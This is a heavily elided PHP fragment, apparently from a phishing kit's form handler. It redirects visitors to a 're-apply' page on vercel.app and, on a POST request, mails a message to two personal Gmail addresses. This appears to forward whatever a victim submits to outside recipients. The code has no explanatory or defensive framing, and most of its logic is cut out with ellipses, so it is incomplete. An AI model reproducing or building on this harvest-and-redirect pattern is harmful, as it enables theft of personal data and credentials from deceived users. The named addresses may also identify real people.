...
header("Location: https://again-re-apply-here.vercel.app/");
...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    ...
    try {
        ...
        $mail->addAddress('official.olivia.smiith@gmail.com');
       $mail->addAddress('kaish5102@gmail.com');
